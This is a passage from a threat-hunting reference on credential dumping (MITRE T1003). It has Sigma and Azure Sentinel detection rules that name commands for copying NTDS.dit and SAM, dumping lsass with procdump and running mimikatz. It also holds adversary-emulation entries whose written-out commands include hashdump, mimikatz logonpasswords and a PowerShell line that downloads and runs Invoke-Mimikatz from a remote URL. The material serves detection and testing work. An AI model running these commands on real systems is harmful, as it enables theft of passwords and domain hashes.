                  'id': '05f3c945-dcc8-4393-9f3d-af65077a8f86',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'modified': '2018/12/11',
                  'references': ['https://adsecurity.org/?p=2288',
                                 'https://www.hybrid-analysis.com/sample/f2943f5e45befa52fb12748ca7171d30096e1d4fc3c365561497c618341299d5?environmentId=100'],
                  'status': 'experimental',
                  'tags': ['attack.credential_access', 'attack.t1003'],
                  'title': 'Suspicious SYSVOL Domain Group Policy Access'}},
 {'data_source': {'author': 'Florian Roth, Michael Haag',
                  'description': 'Detects suspicious commands that could be '
                                 'related to activity that uses volume shadow '
                                 'copy to steal and retrieve hashes from the '
                                 'NTDS.dit file remotely',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': ['vssadmin.exe '
                                                              'Delete Shadows',
                                                              'vssadmin create '
                                                              'shadow /for=C:',
                                                              'copy '
                                                              '\\\\?\\GLOBALROOT\\Device\\\\*\\windows\\ntds\\ntds.dit',
                                                              'copy '
                                                              '\\\\?\\GLOBALROOT\\Device\\\\*\\config\\SAM',
                                                              'vssadmin delete '
                                                              'shadows /for=C:',
                                                              'reg SAVE '
                                                              'HKLM\\SYSTEM ',
                                                              'esentutl.exe /y '
                                                              '/vss '
                                                              '*\\ntds.dit*']}},
                  'falsepositives': ['Administrative activity'],
                  'fields': ['CommandLine', 'ParentCommandLine'],
                  'id': 'b932b60f-fdda-4d53-8eda-a170c1d97bbd',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://www.swordshield.com/2015/07/getting-hashes-from-ntds-dit-file/',
                                 'https://room362.com/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/',
                                 'https://www.trustwave.com/Resources/SpiderLabs-Blog/Tutorial-for-NTDS-goodness-(VSSADMIN,-WMIS,-NTDS-dit,-SYSTEM)/',
                                 'https://securingtomorrow.mcafee.com/mcafee-labs/new-teslacrypt-ransomware-arrives-via-spam/',
                                 'https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/'],
                  'status': 'experimental',
                  'tags': ['attack.credential_access', 'attack.t1003'],
                  'title': 'Activity Related to NTDS.dit Domain Hash '
                           'Retrieval'}}]
```

## Potential Queries

```json
[{'name': 'Credential Dumping ImageLoad',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 7and (module_loaded contains '
           '"C:\\\\Windows\\\\System32\\\\samlib.dll"or module_loaded contains '
           '"C:\\\\Windows\\\\System32\\\\WinSCard.dll"or module_loaded '
           'contains "C:\\\\Windows\\\\System32\\\\cryptdll.dll"or '
           'module_loaded contains "C:\\\\Windows\\\\System32\\\\hid.dll"or '
           'module_loaded contains '
           '"C:\\\\Windows\\\\System32\\\\vaultcli.dll")and (process_path '
           '!contains "\\\\Sysmon.exe"or process_path !contains '
           '"\\\\svchost.exe"or process_path !contains "\\\\logonui.exe")'},
 {'name': 'Credential Dumping Process',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1 and (process_command_line contains '
           '"Invoke-Mimikatz -DumpCreds"or process_command_line contains '
           '"gsecdump -a"or process_command_line contains "wce -o"or '
           'process_command_line contains "procdump -ma lsass.exe"or '
           'process_command_line contains "ntdsutil*ac i ntds*ifm*create '
           'full")'},
 {'name': 'Credential Dumping Process Access',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 10 and target_process_path contains '
           '"C:\\\\Windows\\\\system32\\\\lsass.exe"and '
           '(process_granted_access contains "0x1010"or process_granted_access '
           'contains "0x1410"or process_granted_access contains "0x147a"or '
           'process_granted_access contains "0x143a")and process_call_trace '
           'contains "C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll"and '
           'process_call_trace contains '
           '"C:\\\\Windows\\\\system32\\\\KERNELBASE.dll"and '
           'process_call_trace contains "|UNKNOWN(*)"'},
 {'name': 'Credential Dumping Registry',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14) '
           'and process_path !contains '
           '"C:\\\\WINDOWS\\\\system32\\\\lsass.exe"and (registry_key_path '
           'contains '
           '"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Authentication\\\\Credential '
           'Provider\\\\"or registry_key_path contains '
           '"\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\"or '
           'registry_key_path contains '
           '"\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\SecurityProviders\\\\"or '
           'registry_key_path contains '
           '"\\\\Control\\\\SecurityProviders\\\\WDigest\\\\")and '
           'registry_key_path !contains '
           '"\\\\Lsa\\\\RestrictRemoteSamEventThrottlingWindow"'},
 {'name': 'Credential Dumping Registry Save',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1 and process_path contains "reg.exe"and '
           '(process_command_line contains "*save*HKLM\\\\sam*"or '
           'process_command_line contains "*save*HKLM\\\\system*")'},
 {'name': 'Yml',
  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
  'query': 'Yml\n'
           'title: obtaining credentials based DCC2\n'
           'description: windows server 2008 simulation test results\n'
           'references: https://baijiahao.baidu.com/s?id=1611304657392579351\n'
           'tags: T1003\n'
           'status: experimental\n'
           'author: 12306Bro\n'
           'logsource:\n'
           '\xa0\xa0\xa0\xa0product: windows\n'
           '\xa0\xa0\xa0\xa0service: security\n'
           'detection:\n'
           '\xa0\xa0\xa0\xa0selection1:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID: 4688 # Process Creation\n'
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0NewProcessname: '* \\ "
           "mimikatz.exe' # new process name\n"
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Tokenpromotiontype: '
           "'TokenElevationTypeFull (2)' # token type lifting\n"
           '\xa0\xa0\xa0\xa0selection2:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID: 4673 # privilege has been '
           'invoked service.\n'
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Processname: '* \\ mimikatz.exe' # "
           'Process> Process Name\n'
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Privilege: 'SeTcbPrivilege' # "
           'service request information> privilege: SeTcbPrivilege\n'
           '\xa0\xa0\xa0\xa0timeframe: last 5s\n'
           '\xa0\xa0\xa0\xa0condition: all of them\n'
           'level: medium'},
 {'name': 'Yml',
  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
  'query': 'Yml\n'
           'title: VSS shadow copy Ntds.dit file read local (host OS control '
           'field, is also applicable to a VSS shadow copy remote read '
           'Ntds.dit file)\n'
           'description: windows server 2008 simulation test results\n'
           'references: https://1sparrow.com/2018/02/19/ infiltration '
           'associated domain /\n'
           'tags: T1003\n'
           'status: experimental\n'
           'author: 12306Bro\n'
           'logsource:\n'
           '\xa0\xa0\xa0\xa0product: windows\n'
           '\xa0\xa0\xa0\xa0service: sysmon\n'
           'detection:\n'
           '\xa0\xa0\xa0\xa0selection1:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID: 1 # Process Creation\n'
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Image: 'C: \\ Windows \\ System32 "
           "\\ vssadmin.exe'\n"
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0CommandLine: 'VSSADMIN.EXE'\n"
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0CurrentDirectory: 'vssadmin create "
           "shadow / for = C:'\n"
           '\xa0\xa0\xa0\xa0selection2:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID: 1\n'
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Image: 'C: \\ Windows \\ System32 "
           "\\ reg.exe'\n"
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0CommandLine: 'reg.exe'\n"
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0CurrentDirectory: 'reg SAVE HKLM "
           "\\ SYSTEM *'\n"
           '\xa0\xa0\xa0\xa0selection3:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID: 1 # Process Creation\n'
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Image: 'C: \\ Windows \\ System32 "
           "\\ vssadmin.exe'\n"
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0CommandLine: 'VSSADMIN.EXE'\n"
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0CurrentDirectory: 'vssadmin delete "
           "shadows / all'\n"
           '\xa0\xa0\xa0\xa0condition: selection1 or selection2 or selection3\n'
           'level: medium'},
 {'name': 'Yml',
  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
  'query': 'Yml\n'
           'title: SPN service scans honeypot accounts\n'
           'description: 0day.org simulation test results\n'
           'references: https://adsecurity.org/?p=3458\n'
           'tags: T1003\n'
           'status: experimental\n'
           'author: 12306Bro\n'
           'logsource:\n'
           '\xa0\xa0\xa0\xa0product: windows\n'
           '\xa0\xa0\xa0\xa0service: security\n'
           'detection:\n'
           '\xa0\xa0\xa0\xa0selection:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID: 4769 # Kerberos service '
           'ticket was requested.\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0ServiceName: abcc # Service '
           'Information> Service Name (honeypot user account)\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Clientaddress: :: ffff: * # '
           'Network Information> Client Address\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Ticketoptions: 0x40810000 # '
           'Additional information> ticket information\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Ticketencryptiontype: 0x17 # '
           'Additional information> Ticket Encryption Type\n'
           '\xa0\xa0\xa0\xa0condition: selection\n'
           'level: medium'},
 {'name': 'Yml',
  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
  'query': 'Yml\n'
           'title: win-vaultcmd obtain basic information system credentials\n'
           'description: windows server 2016\n'
           'tags: T1003\n'
           'status: experimental\n'
           'author: 12306Bro\n'
           'logsource:\n'
           '\xa0\xa0\xa0\xa0product: windows\n'
           '\xa0\xa0\xa0\xa0service: security / Sysmon\n'
           'detection:\n'
           '\xa0\xa0\xa0\xa0selection:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0- 4688 #windows '
           'security log, have created a new process.\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0- 1 #windows Sysmon '
           'log, create a new process\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0New processname: C: \\ Windows \\ '
           'System32 \\ VaultCmd.exe # new process name / image\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Parent processname: C: \\ Windows '
           '\\ System32 \\ cmd.exe # creator Process Name / ParentImage\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Process commandline:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0- vaultcmd / list # '
           'list the vault (vault) list\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0- vaultcmd / '
           'listschema # listed vault (vault) a summary of the credentials '
           'name and GUID\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0- vaultcmd / '
           'listcreds: {*} # Chinese system, the list of all the credentials '
           'of the GUID} * {vault (Vault)\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0All credential '
           'information under the "*" # English system, called the list "*" '
           'vault (vault): vaultcmd / listcreds -\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0- vaultcmd / '
           'listproperties: {*} # Chinese system, as listed attributes GUID} * '
           '{vault (Vault), including the file location, the number of '
           'credentials included, protection method\n'
           '\xa0\xa0\xa0\xa0condition: selection'},
 {'name': 'Yml',
  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
  'query': 'Yml\n'
           'title: Use vssown.vbs get NTDS.dit file\n'
           'description: windows server 2016+ AD domain controller\n'
           'tags: T1003\n'
           'status: experimental\n'
           'author: 12306Bro\n'
           'logsource:\n'
           '\xa0\xa0\xa0\xa0product: windows\n'
           '\xa0\xa0\xa0\xa0service: security\n'
           'detection:\n'
           '\xa0\xa0\xa0\xa0selection:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID: 4688 # have created a new '
           'process.\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0New processname: C: \\ Windows \\ '
           'System32 \\ cscript.exe\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Process commandline:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0- cscript * .vbs / '
           'start # command line based detection\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0- cscript * .vbs / '
           'create c # command line based detection\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0- cscript * .vbs / '
           'delete # command line based detection\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0- cscript * .vbs / '
           'list # command line based detection\n'
           '\xa0\xa0\xa0\xa0condition: selection\n'
           '---\n'
           'detection:\n'
           '\xa0\xa0\xa0\xa0selection1:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID: 4904 # has been trying to '
           'register a security event source.\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Processname: C: \\ Windows \\ '
           'System32 \\ VSSVC.exe\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Source name: VSSAudit # Event '
           'Source\n'
           '\xa0\xa0\xa0\xa0selection2:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID: 8222 # shadow copy has '
           'been created.\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Process image name: C: \\ Windows '
           '\\ System32 \\ wbem \\ WmiPrvSE.exe\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Raw volume: \\\\ \\ Volume {*} \\ '
           '# "*" represents the regular match?\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Shadow device name: \\\\ \\ '
           'GLOBALROOT \\ Device \\ HarddiskVolumeShadowCopy * # "*" '
           'represents the regular match?\n'
           '\xa0\xa0\xa0\xa0selection3:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID: 4905 # has been trying to '
           'unregister a security event source.\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Processname: C: \\ Windows \\ '
           'System32 \\ VSSVC.exe\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Source name: VSSAudit # Event '
           'Source\n'
           '\xa0\xa0\xa0\xa0timeframe: last 10S # custom time range\n'
           '\xa0\xa0\xa0\xa0condition: all of them\n'
           'level: medium'},
 {'name': 'Yml',
  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
  'query': 'Yml\n'
           'title: Use ntdsutil get NTDS.dit file\n'
           'description: windows server 2008 + AD domain controller\n'
           'references: '
           'https://blog.csdn.net/Fly_hps/article/details/80641987\n'
           'tags: T1003\n'
           'status: experimental\n'
           'author: 12306Bro\n'
           'logsource:\n'
           '\xa0\xa0\xa0\xa0product: windows\n'
           '\xa0\xa0\xa0\xa0service: security\n'
           'detection:\n'
           '\xa0\xa0\xa0\xa0selection:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID: 4688 # have created a new '
           'process.\n'
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Newprocessname: 'C: \\ Windows \\ "
           "System32 \\ ntdsutil.exe' # new process name\n"
           '\xa0\xa0\xa0\xa0condition: selection\n'
           'level: medium'},
 {'name': 'Yml',
  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
  'query': 'Yml\n'
           'title: Application log file detection ntdsutil get NTDS.dit\n'
           'description: windows server 2008 + AD domain controller\n'
           'references: '
           'https://blog.csdn.net/Fly_hps/article/details/80641987\n'
           'tags: T1003\n'
           'status: experimental\n'
           'author: 12306Bro\n'
           'logsource:\n'
           '\xa0\xa0\xa0\xa0product: windows\n'
           '\xa0\xa0\xa0\xa0service: application\n'
           'detection:\n'
           '\xa0\xa0\xa0\xa0selection1:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID: 2005\n'
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Message: 'lsass (*) * Example "
           'shadow copy is starting. This will be a complete shadow copy. * # '
           "Represents any number 'value matches\n"
           '\xa0\xa0\xa0\xa0selection2:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID: 2001\n'
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Message: 'lsass (*) * Shadow copy "
           "instance freeze has begun. * # Represents any number 'value "
           'matches\n'
           '\xa0\xa0\xa0\xa0selection3:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID: 2003\n'
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Message: 'lsass (*) * Shadow copy "
           "instance freeze stopped. * # Represents any number 'value matches\n"
           '\xa0\xa0\xa0\xa0selection4:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID: 2006\n'
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Message: 'lsass (*) * Volume "
           'Shadow Copy instance completed successfully. * # Represents any '
           "number 'value matches\n"
           '\xa0\xa0\xa0\xa0selection5:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID: 300\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Message: lsass (*) The database '
           'engine is initialized recovery steps. On behalf of any value '
           'matches the number # *\n'
           '\xa0\xa0\xa0\xa0selection6:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID: triggering a large number '
           'of events during the 216 216 #\n'
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Message: 'lsass (*) detects that "
           'the database location changed from: "C \\ Windows \\ NTDS \\ '
           'ntds.dit" is "? \\\\ \\ GLOBALROOT \\ Device \\ '
           'HarddiskVolumeShadowCopy * 1 * \\ Windows \\ NTDS \\ ntds.dit". * '
           "# Represents any number 'value matches\n"
           '\xa0\xa0\xa0\xa0selection7:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID: 302\n'
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Message: 'lsass (*) The database "
           'engine has successfully completed recovery steps. * # Represents '
           "any number 'value matches\n"
           'timeframe: last 10S # custom time range\n'
           '\xa0\xa0\xa0\xa0condition: all of them\n'
           'level: medium'},
 {'name': 'Yml',
  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
  'query': 'Yml\n'
           'title: plaintext to obtain the voucher --Procdump\n'
           'description: windows server 2008 simulation test results\n'
           'status: experimental\n'
           'author: 12306Bro\n'
           'logsource:\n'
           '\xa0\xa0\xa0\xa0product: windows\n'
           '\xa0\xa0\xa0\xa0service: sysmon\n'
           'detection:\n'
           '\xa0\xa0\xa0\xa0selection1:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID: 1\n'
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Image: '* \\ procdump * .exe'\n"
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0Product: ProcDump\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0OriginalFileName: procdump\n'
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0CommandLine: 'procdump * .exe -ma "
           "lsass.exe * .dmp'\n"
           '\xa0\xa0\xa0\xa0selection2:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID: 10\n'
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0SourceImage: '* \\ procdump * "
           ".exe'\n"
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0TargetImage: 'C: \\ Windows \\ "
           "system32 \\ lsass.exe'\n"
           '\xa0\xa0\xa0\xa0timeframe: last 1m\n'
           '\xa0\xa0\xa0\xa0condition: all of them\n'
           'level: medium'}]
```

## Raw Dataset

```json
[{'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': '',
                                                  'Category': 'T1003',
                                                  'Cobalt Strike': 'hashdump\n'
                                                                   'mimikatz '
                                                                   '!lsadump::sam',
                                                  'Description': 'Dumps hashes '
                                                                 'from the SAM '
                                                                 'Hive file.',
                                                  'Metasploit': 'hashdump\n'
                                                                'run hashdump\n'
                                                                'run '
                                                                'smart_hashdump\n'
                                                                'post/windows/gather/credentials/domain_hashdump'}},
 {'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': '',
                                                  'Category': 'T1003',
                                                  'Cobalt Strike': 'logonpasswords\n'
                                                                   'mimikatz '
                                                                   '!sekurlsa::logonpasswords\n'
                                                                   'mimikatz '
                                                                   '!sekurlsa::msv\n'
                                                                   'mimikatz '
                                                                   '!sekurlsa::kerberos\n'
                                                                   'mimikatz '
                                                                   '!sekurlsa::wdigest',
                                                  'Description': 'This '
                                                                 'technique '
                                                                 'injects into '
                                                                 'the '
                                                                 'LSASS.exe '
                                                                 'process and '
                                                                 'scrapes its '
                                                                 'memory for '
                                                                 'plaintext '
                                                                 'passwords of '
                                                                 'logged on '
                                                                 'users. You '
                                                                 'must do this '
                                                                 'from a high '
                                                                 'integrity '
                                                                 'process. \n'
                                                                 'The Mimikatz '
                                                                 'project has '
                                                                 'a lot of '
                                                                 'different '
                                                                 'capabilities '
                                                                 '(https://github.com/gentilkiwi/mimikatz/wiki) '
                                                                 'such as '
                                                                 'pass-the-hash, '
                                                                 'pass-the-ticket, '
                                                                 'creating '
                                                                 'silver/golden '
                                                                 'tickets, '
                                                                 'dumping '
                                                                 'credentials, '
                                                                 'and '
                                                                 'elevating a '
                                                                 'process.',
                                                  'Metasploit': 'use mimikatz\n'
                                                                'wdigest\n'
                                                                'msv\n'
                                                                'kerberos\n'
                                                                'logonpasswords'}},
 {'Atomic Red Team Test - Credential Dumping': {'atomic_tests': [{'description': 'Dumps '
                                                                                 'credentials '
                                                                                 'from '
                                                                                 'memory '
                                                                                 'via '
                                                                                 'Powershell '
                                                                                 'by '
                                                                                 'invoking '
                                                                                 'a '
                                                                                 'remote '
                                                                                 'mimikatz '
                                                                                 'script.\n'
                                                                                 '\n'
                                                                                 'If '
                                                                                 'Mimikatz '
                                                                                 'runs '
                                                                                 'successfully '
                                                                                 'you '
                                                                                 'will '
                                                                                 'see '
                                                                                 'several '
                                                                                 'usernames '
                                                                                 'and '
                                                                                 'hashes '
                                                                                 'output '
                                                                                 'to '
                                                                                 'the '
                                                                                 'screen.\n'
                                                                                 '\n'
                                                                                 'Common '
                                                                                 'failures '
                                                                                 'include '
                                                                                 'seeing '
                                                                                 'an '
                                                                                 '"access '
                                                                                 'denied" '
                                                                                 'error '
                                                                                 'which '
                                                                                 'results '
                                                                                 'when '
                                                                                 'Anti-Virus '
                                                                                 'blocks '
                                                                                 'execution. \n'
                                                                                 'Or, '
                                                                                 'if '
                                                                                 'you '
                                                                                 'try '
                                                                                 'to '
                                                                                 'run '
                                                                                 'the '
                                                                                 'test '
                                                                                 'without '
                                                                                 'the '
                                                                                 'required '
                                                                                 'administrative '
                                                                                 'privleges '
                                                                                 'you '
                                                                                 'will '
                                                                                 'see '
                                                                                 'this '
                                                                                 'error '
                                                                                 'near '
                                                                                 'the '
                                                                                 'bottom '
                                                                                 'of '
                                                                                 'the '
                                                                                 'output '
                                                                                 'to '
                                                                                 'the '
                                                                                 'screen '
                                                                                 '"ERROR '
                                                                                 'kuhl_m_sekurlsa_acquireLSA"\n',
                                                                  'executor': {'command': 'IEX '
                                                                                          '(New-Object '
                                                                                          "Net.WebClient).DownloadString('#{remote_script}'); "
                                                                                          'Invoke-Mimikatz '
                                                                                          '-DumpCreds\n',
                                                                               'elevation_required': True,
                                                                               'name': 'powershell'},
                                                                  'input_arguments': {'remote_script': {'default': 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1',
                                                                                                        'description': 'URL '
                                                                                                                       'to '
                                                                                                                       'a '
                                                                                                                       'remote '
                                                                                                                       'Mimikatz '
                                                                                                                       'script '
                                                                                                                       'that '
                                                                                                                       'dumps '
                                                                                                                       'credentials',
                                                                                                        'type': 'Url'}},
                                                                  'name': 'Powershell '
                                                                          'Mimikatz',
                                                                  'supported_platforms': ['windows']},
                                                                 {'dependencies': [{'description': 'Gsecdump '
                                                                                                   'must '
                                                                                                   'exist '
                                                                                                   'on '
                                                                                                   'disk '
                                                                                                   'at '
                                                                                                   'specified '
                                                                                                   'location '
                                                                                                   '(#{gsecdump_exe})\n',
                                                                                    'get_prereq_command': '$parentpath '
                                                                                                          '= '
                                                                                                          'Split-Path '
                                                                                                          '"#{gsecdump_exe}"; '
                                                                                                          '$binpath '
                                                                                                          '= '
                                                                                                          '"$parentpath\\gsecdump-v2b5.exe"\n'
                                                                                                          'IEX(IWR '
                                                                                                          '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")\n'
                                                                                                          'if(Invoke-WebRequestVerifyHash '
                                                                                                          '"#{gsecdump_url}" '
                                                                                                          '"$binpath" '
                                                                                                          '#{gsecdump_bin_hash}){\n'
                                                                                                          '  '
                                                                                                          'Move-Item '
                                                                                                          '$binpath '
                                                                                                          '"#{gsecdump_exe}"\n'
                                                                                                          '}\n',
                                                                                    'prereq_command': 'if '
                                                                                                      '(Test-Path '
                                                                                                      '#{gsecdump_exe}) '
                                                                                                      '{exit '
                                                                                                      '0} '
                                                                                                      'else '
                                                                                                      '{exit '
                                                                                                      '1}\n'}],
                                                                  'dependency_executor_name': 'powershell',
                                                                  'description': 'Dump '
                                                                                 'credentials '
                                                                                 'from '
                                                                                 'memory '
                                                                                 'using '
                                                                                 'Gsecdump.\n'
                                                                                 '\n'
                                                                                 'Upon '
                                                                                 'successful '
                                                                                 'execution, '
                                                                                 'you '
                                                                                 'should '
                                                                                 'see '
                                                                                 "domain\\username's "
                                                                                 'following '
                                                                                 'by '
                                                                                 'two '
                                                                                 '32 '
                                                                                 'characters '
                                                                                 'hashes.\n'
                                                                                 '\n'
                                                                                 'If '
                                                                                 'you '
                                                                                 'see '
                                                                                 'output '
                                                                                 'that '
                                                                                 'says '
                                                                                 '"compat: '
                                                                                 'error: '
                                                                                 'failed '
                                                                                 'to '
                                                                                 'create '
                                                                                 'child '
                                                                                 'process", '
                                                                                 'execution '
                                                                                 'was '
                                                                                 'likely '
                                                                                 'blocked '
                                                                                 'by '
                                                                                 'Anti-Virus. \n'
                                                                                 'You '
                                                                                 'will '
                                                                                 'receive '
                                                                                 'only '
                                                                                 'error '
                                                                                 'output '
                                                                                 'if '
                                                                                 'you '
                                                                                 'do '
                                                                                 'not '
                                                                                 'run '
                                                                                 'this '
                                                                                 'test '
                                                                                 'from '
                                                                                 'an '
                                                                                 'elevated '
                                                                                 'context '
                                                                                 '(run '
                                                                                 'as '
                                                                                 'administrator)\n'
                                                                                 '\n'
                                                                                 'If '
                                                                                 'you '
                                                                                 'see '
                                                                                 'a '
                                                                                 'message '
                                                                                 'saying '
                                                                                 '"The '
                                                                                 'system '
                                                                                 'cannot '
                                                                                 'find '
                                                                                 'the '
                                                                                 'path '
                                                                                 'specified", '
                                                                                 'try '
                                                                                 'using '
                                                                                 'the '
                                                                                 'get-prereq_commands '
                                                                                 'to '
                                                                                 'download '
                                                                                 'and '
                                                                                 'install '
                                                                                 'Gsecdump '
                                                                                 'first.\n',
                                                                  'executor': {'command': '#{gsecdump_exe} '
                                                                                          '-a\n',
                                                                               'elevation_required': True,
                                                                               'name': 'command_prompt'},
                                                                  'input_arguments': {'gsecdump_bin_hash': {'default': '94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC',
                                                                                                            'description': 'File '
                                                                                                                           'hash '
                                                                                                                           'of '
                                                                                                                           'the '
                                                                                                                           'Gsecdump '
                                                                                                                           'binary '
                                                                                                                           'file',
                                                                                                            'type': 'String'},
                                                                                      'gsecdump_exe': {'default': 'PathToAtomicsFolder\\T1003\\bin\\gsecdump.exe',
                                                                                                       'description': 'Path '
                                                                                                                      'to '
                                                                                                                      'the '
                                                                                                                      'Gsecdump '
                                                                                                                      'executable',
                                                                                                       'type': 'Path'},
                                                                                      'gsecdump_url': {'default': 'https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe',
                                                                                                       'description': 'Path '
                                                                                                                      'to '
                                                                                                                      'download '
                                                                                                                      'Gsecdump '
                                                                                                                      'binary '
                                                                                                                      'file',
                                                                                                       'type': 'url'}},
